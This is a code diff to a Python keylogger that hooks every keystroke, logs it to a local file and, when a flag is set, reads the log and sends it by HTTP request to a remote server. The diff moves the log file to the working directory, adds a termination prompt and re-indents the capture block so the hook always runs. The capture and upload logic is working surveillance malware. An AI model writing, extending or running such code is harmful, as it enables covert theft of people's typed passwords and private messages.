@@ -1,6 +1,5 @@
 from functools import partial
 from urllib import request
-from pathlib import Path
 import atexit
 import json
 import os
@@ -12,7 +11,7 @@ MAP = {
   "\r": "\n"
 }
 
-FILE_NAME = "{0}/keystrokes.log".format(str(Path.home()))
+FILE_NAME = "./keystrokes.log"
 SEND_TO_REMOTE_SERVER = False
 TERMINATE_KEY = "f7"
 
@@ -39,6 +38,7 @@ def onexit(output):
   output.close()
 
 def main():
+  print("Press F7 to terminate")
   if SEND_TO_REMOTE_SERVER:
     if os.path.exists(FILE_NAME):
       file = open(FILE_NAME, "r").read()
@@ -55,16 +55,16 @@ def main():
         }
       )
       request.urlopen(req)
-    try:
-      if os.path.exists(FILE_NAME):
-        os.remove(FILE_NAME) # Delete the old file
-      is_down = {} # Indicates if a key is being pressed
-      output = open(FILE_NAME, "a") # Output file
-      atexit.register(onexit, output) # Close the file at the end of the program
-      keyboard.hook(partial(callback, output, is_down)) # Install the keylogger
-      keyboard.wait(TERMINATE_KEY) # Run until end key is pressed
-    except PermissionError:
-      print("File is probably being used by another process")
+  try:
+    if os.path.exists(FILE_NAME):
+      os.remove(FILE_NAME) # Delete the old file
+    is_down = {} # Indicates if a key is being pressed
+    output = open(FILE_NAME, "a") # Output file
+    atexit.register(onexit, output) # Close the file at the end of the program
+    keyboard.hook(partial(callback, output, is_down)) # Install the keylogger
+    keyboard.wait(TERMINATE_KEY) # Run until end key is pressed
+  except PermissionError:
+    print("File is probably being used by another process")
 
 if __name__ == "__main__":
   main()
